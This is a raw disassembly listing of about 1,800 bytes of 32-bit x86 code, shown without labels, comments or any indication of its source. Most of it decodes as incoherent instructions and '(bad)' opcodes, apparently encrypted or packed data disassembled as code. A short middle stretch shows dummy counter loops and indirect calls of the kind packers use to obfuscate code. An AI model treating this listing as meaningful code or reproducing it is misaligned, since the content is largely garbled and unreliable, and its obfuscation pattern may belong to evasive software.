  40a913:	pusha  
  40a914:	xor    BYTE PTR [esi+0x1f49ef05],ch
  40a91a:	sti    
  40a91b:	aad    0x9a
  40a91d:	rol    BYTE PTR [ebp+0x60],0xf2
  40a921:	hlt    
  40a922:	mov    ds:0xa81f7cc3,eax
  40a927:	test   al,0x87
  40a929:	shl    ch,1
  40a92b:	add    DWORD PTR ds:0x58833e25,esi
  40a931:	mov    ds:0xad726632,al
  40a936:	stos   DWORD PTR es:[edi],eax
  40a937:	fsubr  DWORD PTR [ebp-0x11]
  40a93a:	into   
  40a93b:	xchg   esp,eax
  40a93c:	test   DWORD PTR [esi+ebx*1],ebp
  40a93f:	fimul  DWORD PTR [ebx+0x35c7bded]
  40a945:	mov    ebp,0xea0db5aa
  40a94a:	adc    dl,BYTE PTR [esi]
  40a94c:	push   esi
  40a94d:	mov    dh,0x50
  40a94f:	ins    BYTE PTR es:[edi],dx
  40a950:	and    eax,0xc49d49ae
  40a955:	icebp  
  40a956:	loop   0x40a9cd
  40a958:	fscale 
  40a95a:	aad    0xd0
  40a95c:	mov    dh,BYTE PTR [esi+0x5c]
  40a95f:	xor    eax,DWORD PTR [ecx-0x7d6f1d2c]
  40a965:	(bad)  
  40a967:	(bad)  
  40a968:	sahf   
  40a969:	pop    ebx
  40a96a:	xor    BYTE PTR [edi+0x38],bh
  40a96d:	sar    DWORD PTR [eax-0x41],0x96
  40a971:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a972:	sti    
  40a973:	(bad)  
  40a974:	icebp  
  40a975:	mov    eax,0xddc35752
  40a97a:	mov    ebx,DWORD PTR [ebx+0x49]
  40a97d:	sbb    DWORD PTR [ebx],ebp
  40a97f:	jp     0x40a90d
  40a981:	ins    BYTE PTR es:[edi],dx
  40a982:	mov    esp,0x2e1e4460
  40a987:	out    0xe6,al
  40a989:	xchg   esp,eax
  40a98a:	pop    eax
  40a98b:	scas   eax,DWORD PTR es:[edi]
  40a98c:	mov    dl,0x17
  40a98e:	sub    al,0xfc
  40a990:	jge    0x40a9c7
  40a992:	xchg   esp,eax
  40a993:	pushf  
  40a994:	sub    eax,DWORD PTR cs:[eax]
  40a997:	faddp  st(6),st
  40a999:	enter  0x445f,0xd1
  40a99d:	dec    ebx
  40a99e:	loop   0x40a9ec
  40a9a0:	fst    st(5)
  40a9a2:	cwde   
  40a9a3:	xor    DWORD PTR [ecx],esp
  40a9a5:	aad    0xe1
  40a9a7:	es cmp al,0x12
  40a9aa:	jnp    0x40a9f4
  40a9ac:	gs push esi
  40a9ae:	js     0x40a93c
  40a9b0:	ja     0x40a9ee
  40a9b2:	push   0x64
  40a9b4:	ins    BYTE PTR es:[di],dx
  40a9b6:	xchg   edx,eax
  40a9b7:	dec    esp
  40a9b8:	retf   0x7e3a
  40a9bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9bc:	sub    al,0xfd
  40a9be:	ja     0x40aa27
  40a9c0:	dec    esi
  40a9c1:	add    DWORD PTR [edx],ecx
  40a9c3:	xor    BYTE PTR [edx+0x3c4f859d],cl
  40a9c9:	mov    al,bh
  40a9cb:	rcl    BYTE PTR [ecx-0x1b],1
  40a9ce:	push   0x843776d2
  40a9d3:	push   cs
  40a9d4:	or     ebx,esp
  40a9d6:	enter  0xadf2,0xf3
  40a9da:	shr    BYTE PTR ds:0xcf55820c,cl
  40a9e0:	xchg   ebx,eax
  40a9e1:	add    BYTE PTR [eax-0x26654251],ch
  40a9e7:	jecxz  0x40a995
  40a9e9:	mov    edi,0x4e7d75c
  40a9ee:	stc    
  40a9ef:	(bad)  
  40a9f0:	mov    ds:0x8b247cd8,eax
  40a9f5:	cmp    bl,BYTE PTR [ecx]
  40a9f7:	mov    WORD PTR [ebp+0x6153afa8],fs
  40a9fd:	outs   dx,DWORD PTR ds:[esi]
  40a9fe:	xchg   edi,eax
  40a9ff:	pop    edx
  40aa00:	data16 lods al,BYTE PTR ds:[esi]
  40aa02:	dec    ecx
  40aa03:	jl     0x40a98e
  40aa05:	ret    0xf818
  40aa08:	ret    
  40aa09:	rcr    BYTE PTR [ebx+eiz*2-0x5a2a09eb],0xcd
  40aa11:	int    0xaf
  40aa13:	xor    al,0xfa
  40aa15:	cdq    
  40aa16:	dec    edx
  40aa17:	leave  
  40aa18:	xor    al,0xb3
  40aa1a:	leave  
  40aa1b:	fsubr  st,st(1)
  40aa1d:	jmp    0xeb93:0x9ef346dd
  40aa24:	cwde   
  40aa25:	in     al,dx
  40aa26:	clc    
  40aa27:	popa   
  40aa28:	and    al,0x3
  40aa2a:	iret   
  40aa2b:	cmp    eax,0x2d900f4d
  40aa30:	(bad)  
  40aa31:	cmp    dh,BYTE PTR [esi]
  40aa33:	mov    ds:0x63cbafac,al
  40aa38:	mov    dl,0xa8
  40aa3a:	js     0x40aa26
  40aa3c:	js     0x40aa3e
  40aa3e:	pop    esi
  40aa3f:	pop    es
  40aa40:	push   ss
  40aa41:	add    eax,0x7500097a
  40aa46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa47:	(bad)  
  40aa48:	adc    ch,BYTE PTR gs:[edi+0x38]
  40aa4c:	aas    
  40aa4d:	bound  edx,QWORD PTR [edi+0x4f179657]
  40aa53:	sbb    ecx,ecx
  40aa55:	sbb    eax,0xc89a5480
  40aa5a:	pop    edi
  40aa5b:	push   ebx
  40aa5c:	and    DWORD PTR [edx-0x34],0xffffffe1
  40aa60:	jmp    0x294b:0xca8ade96
  40aa67:	out    0x20,al
  40aa69:	sbb    cl,BYTE PTR [edx+0x7721d58]
  40aa6f:	mov    ?,WORD PTR [edx+0x21dd59cc]
  40aa75:	xor    al,0xec
  40aa77:	pop    edx
  40aa78:	out    dx,al
  40aa79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa7a:	mov    al,0xb
  40aa7c:	call   0x705d6e4b
  40aa81:	ss jne 0x40aac8
  40aa84:	pop    edi
  40aa85:	lds    ecx,FWORD PTR [esi+ecx*4+0x3d]
  40aa89:	jge    0x40aafc
  40aa8b:	sub    eax,0xfdc595d9
  40aa90:	imul   ebx,ebp,0xffffffcd
  40aa93:	(bad)  
  40aa95:	jl     0x40aaee
  40aa97:	dec    esi
  40aa98:	sar    BYTE PTR [edi+0x64],0x22
  40aa9c:	and    al,0xfc
  40aa9e:	xor    al,0x8a
  40aaa0:	mov    esi,0xe911da1
  40aaa5:	out    dx,eax
  40aaa6:	inc    esp
  40aaa7:	fsub   DWORD PTR [edi-0x6e]
  40aaaa:	jnp    0x40aa35
  40aaac:	dec    edi
  40aaad:	mov    al,0x30
  40aaaf:	xor    DWORD PTR [edx+edx*2],0x97e27ea3
  40aab6:	pop    esi
  40aab7:	clc    
  40aab8:	pop    esi
  40aab9:	sub    eax,0x5e69c5c1
  40aabe:	repz and eax,0x28f2399d
  40aac4:	and    al,0x10
  40aac6:	cmp    al,0xdd
  40aac8:	mov    esi,0x89b861c7
  40aacd:	sbb    esi,DWORD PTR [eax-0x72a422a5]
  40aad3:	inc    ebx
  40aad4:	mov    BYTE PTR [ebp-0x58b5f5d0],ah
  40aada:	lods   al,BYTE PTR ds:[esi]
  40aadb:	push   0x98f0ab1f
  40aae0:	sub    eax,0x87d5029f
  40aae5:	xchg   esp,eax
  40aae6:	push   ebp
  40aae7:	lods   eax,DWORD PTR ds:[esi]
  40aae8:	leave  
  40aae9:	aaa    
  40aaea:	rcl    BYTE PTR [edi],cl
  40aaec:	and    al,BYTE PTR [eax+0x77]
  40aaef:	xor    dl,0x83
  40aaf2:	or     BYTE PTR [edi],0xc2
  40aaf5:	push   ss
  40aaf6:	fwait
  40aaf7:	cs shl edx,cl
  40aafa:	popf   
  40aafb:	and    DWORD PTR [esi-0x55],ebx
  40aafe:	pop    es
  40aaff:	xchg   esp,eax
  40ab00:	scas   al,BYTE PTR es:[edi]
  40ab01:	ja     0x40ab76
  40ab03:	test   DWORD PTR [esi+0x27],0x6d580839
  40ab0a:	inc    edx
  40ab0b:	cli    
  40ab0c:	(bad)  
  40ab0d:	mov    ds:0x6d803065,al
  40ab12:	scas   al,BYTE PTR es:[edi]
  40ab13:	adc    bl,0xc1
  40ab16:	pop    es
  40ab17:	xchg   ecx,eax
  40ab18:	popa   
  40ab19:	fsub   DWORD PTR [edi+ecx*1]
  40ab1c:	cmp    esp,ecx
  40ab1e:	(bad)  
  40ab1f:	push   0x744176bc
  40ab24:	adc    esi,DWORD PTR [edx-0x42]
  40ab27:	ret    0xc91e
  40ab2a:	fwait
  40ab2b:	pop    edx
  40ab2c:	sbb    esi,DWORD PTR [eax+ebp*8+0x29]
  40ab30:	push   ss
  40ab31:	dec    edx
  40ab32:	inc    edx
  40ab33:	in     eax,0x52
  40ab35:	push   eax
  40ab36:	dec    eax
  40ab37:	sub    DWORD PTR [ebp-0x24],esi
  40ab3a:	fnstcw WORD PTR [edi]
  40ab3c:	xor    eax,0xb83887a0
  40ab41:	mov    ?,WORD PTR [esi-0x5f7e1f55]
  40ab47:	xlat   BYTE PTR ds:[ebx]
  40ab48:	and    al,0x73
  40ab4a:	daa    
  40ab4b:	int    0x30
  40ab4d:	xor    eax,0x64056d3d
  40ab52:	push   ebx
  40ab53:	stos   DWORD PTR es:[edi],eax
  40ab54:	pop    ecx
  40ab55:	push   esp
  40ab56:	pop    edx
  40ab57:	mov    eax,fs:0xdba22612
  40ab5d:	fcomp  QWORD PTR [eax]
  40ab5f:	stc    
  40ab60:	cmp    ch,al
  40ab62:	dec    edi
  40ab63:	push   0x53
  40ab65:	mov    ss,WORD PTR [eax+edi*4+0x144c89e5]
  40ab6c:	push   ss
  40ab6d:	mov    ch,0xb0
  40ab6f:	rcr    BYTE PTR [edi+0x52d0d7d2],1
  40ab75:	jmp    0x40ab36
  40ab77:	(bad)  
  40ab78:	and    dl,BYTE PTR [esi]
  40ab7a:	sub    BYTE PTR [esp-0x5],bh
  40ab7e:	jg     0x40ab91
  40ab80:	mov    WORD PTR [ebx],ds
  40ab82:	mul    BYTE PTR [edi+eax*2-0x6c]
  40ab86:	push   ss
  40ab87:	cmp    eax,ecx
  40ab89:	cli    
  40ab8a:	xor    edi,edx
  40ab8c:	adc    DWORD PTR [edi-0xf],ebx
  40ab8f:	dec    ecx
  40ab90:	and    BYTE PTR [eax+eax*8-0x336fa17a],bl
  40ab97:	mov    BYTE PTR [eax+0x7809ca4e],ah
  40ab9d:	add    edx,DWORD PTR [ebx-0x44229695]
  40aba3:	out    0x68,eax
  40aba5:	sbb    BYTE PTR [eax-0x8741306],cl
  40abab:	push   es
  40abac:	pop    edx
  40abad:	jno    0x40abdf
  40abaf:	fwait
  40abb0:	dec    esp
  40abb1:	ds mov bl,al
  40abb4:	rcr    BYTE PTR [ecx+0x6123b5ae],cl
  40abba:	push   ebx
  40abbb:	fidivr DWORD PTR [ecx]
  40abbd:	stos   DWORD PTR es:[edi],eax
  40abbe:	aaa    
  40abbf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abc0:	cmp    BYTE PTR [edi],0x4
  40abc3:	adc    eax,0xbaa72c98
  40abc8:	out    0xcc,al
  40abca:	scas   al,BYTE PTR es:[edi]
  40abcb:	bnd call 0x61ae0b3d
  40abd1:	inc    esi
  40abd2:	push   ebp
  40abd3:	loope  0x40abcb
  40abd5:	xchg   BYTE PTR [ebx],dh
  40abd7:	dec    ebp
  40abd8:	ds inc eax
  40abda:	fadd   QWORD PTR [ecx]
  40abdc:	cmp    bh,BYTE PTR [ebp+0x1d]
  40abdf:	int3   
  40abe0:	aam    0x20
  40abe2:	enter  0xccdd,0xdf
  40abe6:	adc    bl,BYTE PTR [esi+0x68f29909]
  40abec:	mov    eax,0x95dd8584
  40abf1:	xlat   BYTE PTR ds:[ebx]
  40abf2:	inc    ebp
  40abf3:	repz add ebx,0x1f2cd17e
  40abfa:	les    esi,FWORD PTR [esi+0xdd087dd]
  40ac00:	xor    edx,eax
  40ac02:	xor    DWORD PTR ds:0x42fd75,0x42e78f
  40ac0c:	add    edx,ecx
  40ac0e:	mov    DWORD PTR ds:0x42e783,0x189b
  40ac18:	cmp    edi,edx
  40ac1a:	mov    DWORD PTR ds:0x42fd5d,0x36a4
  40ac24:	jb     0x40d88a
  40ac2a:	mov    edx,DWORD PTR [ebp-0x28]
  40ac2d:	sbb    DWORD PTR ds:0x42fdfe,ebx
  40ac33:	mov    edi,DWORD PTR [ebp-0x4]
  40ac36:	xor    edx,eax
  40ac38:	sub    DWORD PTR ds:0x42fd75,edx
  40ac3e:	xor    edi,eax
  40ac40:	mov    DWORD PTR ds:0x42e777,0x1f
  40ac4a:	cmp    DWORD PTR ds:0x42e777,0x0
  40ac51:	je     0x40acfa
  40ac57:	cmp    DWORD PTR ds:0x42e777,0x2e
  40ac5e:	jne    0x40ac7d
  40ac64:	push   DWORD PTR [ebp-0xc]
  40ac67:	push   0x42e2bd
  40ac6c:	push   DWORD PTR [ebp-0x24]
  40ac6f:	push   0x691a
  40ac74:	push   DWORD PTR [ebp-0x10]
  40ac77:	call   DWORD PTR ds:0x42e373
  40ac7d:	mov    ebx,DWORD PTR ds:0x42e777
  40ac83:	dec    ebx
  40ac84:	mov    DWORD PTR ds:0x42e777,ebx
  40ac8a:	jmp    0x40ac4a
  40ac8f:	and    DWORD PTR ds:0x42e1a8,0x0
  40ac99:	jmp    0x40acad
  40ac9e:	xor    ebx,ebx
  40aca0:	or     ebx,DWORD PTR ds:0x42e1a8
  40aca6:	inc    ebx
  40aca7:	mov    DWORD PTR ds:0x42e1a8,ebx
  40acad:	cmp    DWORD PTR ds:0x42e1a8,0x1a
  40acb4:	jae    0x40acfa
  40acba:	cmp    DWORD PTR ds:0x42e1a8,0xc
  40acc1:	jne    0x40acd5
  40acc7:	push   0x2dd0
  40accc:	push   DWORD PTR [ebp-0x14]
  40accf:	call   DWORD PTR ds:0x42e377
  40acd5:	cmp    DWORD PTR ds:0x42e1a8,0xb
  40acdc:	jne    0x40acef
  40ace2:	mov    ebx,DWORD PTR ds:0x42e1a8
  40ace8:	inc    ebx
  40ace9:	mov    DWORD PTR ds:0x42e1a8,ebx
  40acef:	jmp    0x40ac9e
  40acf4:	adc    ebx,0x2885
  40acfa:	add    edi,ecx
  40acfc:	sbb    ebx,0x5c75
  40ad02:	add    edx,ecx
  40ad04:	imul   edx,edi
  40ad07:	sub    ebx,DWORD PTR ds:0x42e1b4
  40ad0d:	mov    edi,DWORD PTR [ebp-0x8]
  40ad10:	mov    DWORD PTR ds:0x42fd61,0x13
  40ad1a:	cmp    DWORD PTR ds:0x42fd61,0x0
  40ad21:	je     0x40ad54
  40ad27:	cmp    DWORD PTR ds:0x42fd61,0x14
  40ad2e:	jne    0x40ad42
  40ad34:	push   DWORD PTR [ebp-0x28]
  40ad37:	push   0x42fd81
  40ad3c:	call   DWORD PTR ds:0x42e5cb
  40ad42:	mov    ebx,DWORD PTR ds:0x42fd61
  40ad48:	dec    ebx
  40ad49:	mov    DWORD PTR ds:0x42fd61,ebx
  40ad4f:	jmp    0x40ad1a
  40ad54:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad57:	sub    ebx,edi
  40ad59:	cmp    ebx,edx
  40ad5b:	ja     0x40ad6d
  40ad61:	mov    edx,DWORD PTR [ebp-0x4]
  40ad64:	xor    edx,eax
  40ad66:	add    edx,ecx
  40ad68:	jmp    0x40c0fc
  40ad6d:	mov    edx,DWORD PTR [ebp-0x2c]
  40ad70:	mov    edi,DWORD PTR [ebp-0x4]
  40ad73:	xor    edx,eax
  40ad75:	xor    edi,eax
  40ad77:	add    edi,ecx
  40ad79:	add    edx,ecx
  40ad7b:	imul   edx,edi
  40ad7e:	mov    edi,DWORD PTR [ebp-0x8]
  40ad81:	mov    ebx,DWORD PTR [ebp-0x10]
  40ad84:	sub    ebx,edi
  40ad86:	cmp    ebx,edx
  40ad88:	ja     0x40ad96
  40ad8e:	mov    edx,DWORD PTR [ebp-0x28]
  40ad91:	jmp    0x40c0ee
  40ad96:	mov    edx,DWORD PTR [ebp-0x30]
  40ad99:	mov    edi,DWORD PTR [ebp-0x4]
  40ad9c:	xor    edx,eax
  40ad9e:	xor    edi,eax
  40ada0:	add    edi,ecx
  40ada2:	jmp    0x40b160
  40ada7:	xor    BYTE PTR [eax+eiz*4],bl
  40adaa:	mov    bh,0x6c
  40adac:	mov    bl,0xc7
  40adae:	jae    0x40ae09
  40adb0:	jg     0x40ad82
  40adb2:	ja     0x40ad5f
  40adb4:	lahf   
  40adb5:	push   ss
  40adb6:	int    0x3
  40adb8:	std    
  40adb9:	jo     0x40ae2b
  40adbb:	lahf   
  40adbc:	jge    0x40ae2e
  40adbe:	jo     0x40ad41
  40adc0:	ins    DWORD PTR es:[edi],dx
  40adc1:	in     eax,0x8f
  40adc3:	outs   dx,BYTE PTR ds:[esi]
  40adc4:	lea    eax,[ecx-0x5e]
  40adc7:	cdq    
  40adc8:	leave  
  40adc9:	jnp    0x40ae11
  40adcb:	cmp    DWORD PTR [edx+0x39],esp
  40adce:	std    
  40adcf:	ds dec esp
  40add1:	jp     0x40ad8a
  40add3:	fstp   DWORD PTR [ecx]
  40add5:	sahf   
  40add6:	lds    esi,FWORD PTR [edx+0xc7b8ebb]
  40addc:	push   ebx
  40addd:	and    eax,0x90815da5
  40ade2:	push   edx
  40ade3:	xchg   edi,eax
  40ade4:	sbb    DWORD PTR [edi],0xffffffc3
  40ade7:	inc    ebp
  40ade8:	sbb    ebx,esi
  40adea:	rcr    ebp,0x52
  40aded:	test   BYTE PTR [edi-0x39],0x89
  40adf1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adf2:	ja     0x40ada2
  40adf4:	adc    BYTE PTR [ebx+ebx*2-0x5d],ah
  40adf8:	jmp    0x40ae0e
  40adfa:	sbb    BYTE PTR [edx+0x7454114a],al
  40ae00:	jne    0x40ad88
  40ae02:	cmp    eax,0x11f11c8e
  40ae07:	xchg   edx,eax
  40ae08:	fs ss stc 
  40ae0b:	mov    al,ds:0xb9280584
  40ae10:	call   0xc1f2:0x44089fce
  40ae17:	mov    DWORD PTR [edi],ebx
  40ae19:	jbe    0x40ade8
  40ae1b:	adc    BYTE PTR [ebx-0x61],ah
  40ae1e:	call   0x4d2710b4
  40ae23:	or     eax,0xa2bb57ec
  40ae28:	xlat   BYTE PTR ds:[ebx]
  40ae29:	test   al,0x5c
  40ae2b:	gs cwde 
  40ae2d:	inc    edi
  40ae2e:	(bad)  
  40ae2f:	jg     0x40adfc
  40ae31:	scas   al,BYTE PTR es:[edi]
  40ae32:	mov    ebp,0x98f8735b
  40ae37:	stos   DWORD PTR es:[edi],eax
  40ae38:	retf   0x4118
  40ae3b:	aad    0xa9
  40ae3d:	arpl   WORD PTR [ecx-0x383f90f9],sp
  40ae43:	pop    esi
  40ae44:	retf   0xe49b
  40ae47:	mov    eax,ds:0x21671eb2
  40ae4c:	fwait
  40ae4d:	data16 (bad) 
  40ae4f:	retf   0x9a8f
  40ae52:	cmp    dl,BYTE PTR [ecx-0x4dc599f6]
  40ae58:	(bad)  
  40ae5a:	scas   eax,DWORD PTR es:[edi]
  40ae5b:	jno    0x40ae63
  40ae5d:	arpl   WORD PTR [edx+ebp*4+0x9],ax
  40ae61:	test   ebp,ecx
  40ae63:	je     0x40ae56
  40ae65:	fmul   QWORD PTR [ebx]
  40ae67:	xchg   edi,eax
  40ae68:	push   ebx
  40ae69:	aad    0x2e
  40ae6b:	or     al,0x10
  40ae6d:	sbb    ah,BYTE PTR [edx+eiz*8]
  40ae70:	stc    
  40ae71:	icebp  
  40ae72:	adc    al,0xe9
  40ae74:	xchg   eax,esp
  40ae76:	sub    DWORD PTR [eax],ecx
  40ae78:	daa    
  40ae79:	xor    eax,0xffffff81
  40ae7c:	mov    bl,0x13
  40ae7e:	adc    dl,ch
  40ae80:	jmp    0x2365:0xfd9394b4
  40ae87:	pusha  
  40ae88:	loop   0x40aecd
  40ae8a:	sahf   
  40ae8b:	stos   DWORD PTR es:[edi],eax
  40ae8c:	sub    bl,BYTE PTR [ecx-0x3]
  40ae8f:	xchg   edi,eax
  40ae90:	cli    
  40ae91:	cmp    al,0xfd
  40ae93:	es test eax,0xf2092123
  40ae99:	push   esi
  40ae9a:	lods   al,BYTE PTR ds:[esi]
  40ae9b:	cmp    eax,ebp
  40ae9d:	or     bl,BYTE PTR [ebp+0x20]
  40aea0:	js     0x40ae94
  40aea2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aea3:	leave  
  40aea4:	dec    edx
  40aea5:	aam    0xc9
  40aea7:	or     eax,0x918a739a
  40aeac:	outs   dx,DWORD PTR ds:[esi]
  40aead:	push   ebx
  40aeae:	jo     0x40af1c
  40aeb0:	es (bad) 
  40aeb2:	into   
  40aeb3:	test   BYTE PTR [esi],bh
  40aeb5:	lahf   
  40aeb6:	int3   
  40aeb7:	in     eax,0xd7
  40aeb9:	in     al,dx
  40aeba:	call   0xee6d:0xbcae64e8
  40aec1:	inc    esi
  40aec2:	ret    
  40aec3:	repnz cdq 
  40aec5:	sbb    al,0xce
  40aec7:	pop    edi
  40aec8:	dec    edx
  40aec9:	sub    al,ch
  40aecb:	jnp    0x40ae60
  40aecd:	pop    edx
  40aece:	pop    ebx
  40aecf:	sbb    al,0x18
  40aed1:	mov    eax,0xc1df38d7
  40aed6:	add    BYTE PTR [esi+edx*8-0x3f8fbae7],bh
  40aedd:	mov    ds:0x141c4f51,al
  40aee2:	nop
  40aee3:	out    0x33,al
  40aee5:	test   DWORD PTR ds:0xf3e5ba87,edx
  40aeeb:	ins    DWORD PTR es:[edi],dx
  40aeec:	mov    bh,BYTE PTR [edx+0x2b2d7e4]
  40aef2:	arpl   WORD PTR [edi+0x5],bp
  40aef5:	pop    ebp
  40aef6:	out    0x1e,al
  40aef8:	or     eax,0x7cc4d41d
  40aefd:	ret    0xf742
  40af00:	rol    DWORD PTR [edi+0x4a],cl
  40af03:	pop    ebp
  40af04:	mov    dl,0xd0
  40af06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af07:	out    0xa6,al
  40af09:	mov    ds:0xb8e31150,al
  40af0e:	repnz pop esi
  40af10:	in     eax,dx
  40af11:	fist   DWORD PTR [edx-0x67]
  40af14:	dec    esp
  40af15:	pop    esp
  40af16:	jecxz  0x40aea0
  40af18:	jl     0x40af0d
  40af1a:	jp     0x40af40
  40af1c:	cli    
  40af1d:	sub    eax,0xa9f095bc
  40af22:	pop    esi
  40af23:	stos   DWORD PTR es:[edi],eax
  40af24:	add    eax,0x730b2a7
  40af29:	je     0x40af1c
  40af2b:	(bad)  
  40af2c:	sub    DWORD PTR [ecx-0x28],esi
  40af2f:	and    edi,DWORD PTR ds:0x89770bf0
  40af35:	loopne 0x40af3e
  40af37:	aad    0x1a
  40af39:	ja     0x40af3d
  40af3b:	and    BYTE PTR [eax],0xd3
  40af3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af3f:	add    edi,DWORD PTR [ecx-0x7f6d7d26]
  40af45:	sbb    eax,0xefe58907
  40af4a:	mov    eax,0x23b8e027
  40af4f:	jae    0x40af1c
  40af51:	sar    dl,1
  40af53:	repnz and eax,0xe7d329c3
  40af59:	stc    
  40af5a:	jp     0x40aeff
  40af5c:	pop    edi
  40af5d:	(bad)  
  40af5e:	cld    
  40af5f:	mov    edi,0x8b82e601
  40af64:	fisttp QWORD PTR [edx]
  40af66:	pushf  
  40af67:	mov    cl,0x8d
  40af69:	call   0xae3:0x774588e8
  40af70:	stos   BYTE PTR es:[edi],al
  40af71:	add    dl,BYTE PTR [esi-0x51]
  40af74:	(bad)  
  40af75:	fwait
  40af76:	mov    al,ds:0xfc33536a
  40af7b:	bound  ecx,QWORD PTR [edx-0x5f]
  40af7e:	cld    
  40af7f:	loopne 0x40afbe
  40af81:	sub    DWORD PTR [esi+edi*1+0x79b3e891],ecx
  40af88:	mov    esi,0xb3e3e19
  40af8d:	dec    ebx
  40af8e:	ret    0xa296
  40af91:	push   ds
  40af92:	cmc    
  40af93:	(bad)  
  40af94:	aad    0xdc
  40af96:	sar    edi,0x7
  40af99:	adc    DWORD PTR [ebp+0x16],0xdb843d12
  40afa0:	cmp    eax,0x5d1b6fb7
  40afa5:	cwde   
  40afa6:	and    al,0x13
  40afa8:	cwde   
  40afa9:	xchg   bl,ch
  40afab:	or     bh,al
  40afad:	push   esi
  40afae:	int3   
  40afaf:	inc    ebx
  40afb0:	mov    ebp,0xfd04d83b
  40afb5:	xchg   ebp,eax
  40afb6:	add    DWORD PTR [eax],ecx
  40afb8:	retf   0x1431
  40afbb:	(bad)  
  40afbd:	mov    bl,0x25
  40afbf:	cdq    
  40afc0:	sub    eax,DWORD PTR [esi-0x7e]
  40afc3:	test   eax,0x61667901
  40afc8:	mov    dl,0x3a
  40afca:	js     0x40afd2
  40afcc:	test   eax,0x7eebe923
  40afd1:	push   ecx
  40afd2:	sar    edx,1
  40afd4:	xor    eax,0x797c8247
  40afd9:	shl    DWORD PTR [edi+0x3a934d35],cl
  40afdf:	cs jg  0x40af6d
  40afe2:	loop   0x40afc4
  40afe4:	imul   esi,edx,0xf04ce7c6
  40afea:	mov    BYTE PTR [esi+0xc04cfee],al
  40aff0:	or     al,0x14
  40aff2:	into   
  40aff3:	add    BYTE PTR [ebx+0x224bd621],0xaa
  40affa:	loope  0x40af82
  40affc:	xlat   BYTE PTR ds:[ebx]
  40affd:	dec    edi
  40affe:	xor    al,0x51
  40b000:	mov    bh,0xb0
  40b002:	retf   
  40b003:	or     dh,dl
  40b005:	mov    bh,0xfd
  40b007:	call   DWORD PTR [ebp+0x73407c9d]
  40b00d:	clc    
  40b00e:	ins    BYTE PTR es:[edi],dx
  40b00f:	hlt    
  40b010:	pop    edx
  40b011:	and    al,0xe8
  40b013:	pop    ebp
  40b014:	sbb    BYTE PTR ds:0xad20074b,ah
  40b01a:	loopne 0x40b037
  40b01c:	jb     0x40b045
  40b01e:	push   ebp
  40b01f:	cmp    esp,DWORD PTR [ecx]
  40b021:	push   edi
  40b022:	mov    bh,0x3
  40b024:	sbb    ah,BYTE PTR [ecx-0x4fc1f2eb]
  40b02a:	jp     0x40b036
  40b02c:	icebp  
  40b02d:	out    dx,al
  40b02e:	not    DWORD PTR [edi]
  40b030:	ja     0x40afe1
  40b032:	sti    
  40b033:	and    BYTE PTR [eax],cl
  40b035:	and    al,0x1f
  40b037:	xor    dl,dl
  40b039:	aas    
  40b03a:	std    
  40b03b:	in     al,dx
  40b03c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b03d:	sub    eax,0xaa13d3cd
  40b042:	jecxz  0x40afe8
  40b044:	or     DWORD PTR [esi],ebp
  40b046:	ret    
  40b047:	mov    al,ds:0x53676ee5
  40b04c:	fldcw  WORD PTR [ebp+0x5f]
  40b04f:	mov    bl,BYTE PTR [ecx+edi*8]
  40b052:	pop    ss
  40b053:	xchg   esi,eax
  40b054:	mov    edi,0xf3666946
  40b059:	lea    esi,[edi]
  40b05b:	push   0x72
  40b05d:	mov    WORD PTR [eax],cs
  40b05f:	lock dec esp
  40b061:	mov    DWORD PTR [esi+ebp*4],esp
  40b064:	sub    BYTE PTR [esi-0x44],dh
  40b067:	sbb    eax,0x8ce16797
  40b06c:	sub    DWORD PTR [ebx+0x3],0x9d5e98b8
  40b073:	(bad)  
  40b074:	jnp    0x40b0a2
  40b076:	outs   dx,BYTE PTR ds:[esi]
  40b077:	fisttp DWORD PTR [edx]
  40b079:	jno    0x40b089
  40b07b:	into   
  40b07c:	add    BYTE PTR [esi+ebx*4-0x65],ah
  40b080:	sbb    eax,0x3b4a636d
  40b085:	cld    
  40b086:	fsubr  QWORD PTR [bx+0x75]
  40b08a:	ret    
  40b08b:	mov    esi,0x7ca70546
  40b090:	xor    eax,0x742a3420
  40b095:	jno    0x40b0c2
  40b097:	repnz fidivr DWORD PTR [di+0x741b]
  40b09d:	mov    cl,0x35
  40b09f:	mov    ss,WORD PTR [ecx-0x3]
  40b0a2:	cmp    DWORD PTR ds:0x4cd806a2,ebx
  40b0a8:	and    esp,ebx
  40b0aa:	(bad)  
  40b0ab:	loopne 0x40b043
  40b0ad:	rcr    DWORD PTR [ecx-0x2d0c7c63],cl
  40b0b3:	je     0x40b0da
  40b0b5:	outs   dx,BYTE PTR ds:[esi]
  40b0b6:	jnp    0x40b04f
  40b0b8:	out    dx,eax
  40b0b9:	inc    ebp
  40b0ba:	div    BYTE PTR [ebx-0x16247066]
  40b0c0:	int3   
  40b0c1:	fdivp  st(3),st
  40b0c3:	jmp    0x40b07a
  40b0c5:	loop   0x40b087
  40b0c7:	ret    0xb5e1
  40b0ca:	dec    ebx
  40b0cb:	aam    0x1e
  40b0cd:	jno    0x40b0e9
  40b0cf:	out    dx,eax
  40b0d0:	mov    dl,0x9e
  40b0d2:	adc    DWORD PTR [ebx+0x18],edi
  40b0d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0d6:	jl     0x40b0c2
  40b0d8:	add    eax,0xa70178a8
  40b0dd:	loope  0x40b0c1
  40b0df:	(bad)
  40b0e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0e3:	dec    eax
  40b0e4:	test   ah,0x1
  40b0e7:	arpl   WORD PTR [esi+0xd65da3e],ax
  40b0ed:	pushf  
  40b0ee:	shl    DWORD PTR [esi],0x18
  40b0f1:	dec    ebp
  40b0f2:	out    dx,eax
  40b0f3:	out    0x1e,al
  40b0f5:	mov    bl,0x6f
  40b0f7:	es mov al,0x24
  40b0fa:	sub    esi,edx
  40b0fc:	cmc    
  40b0fd:	jl     0x40b13a
  40b0ff:	xchg   ebx,eax
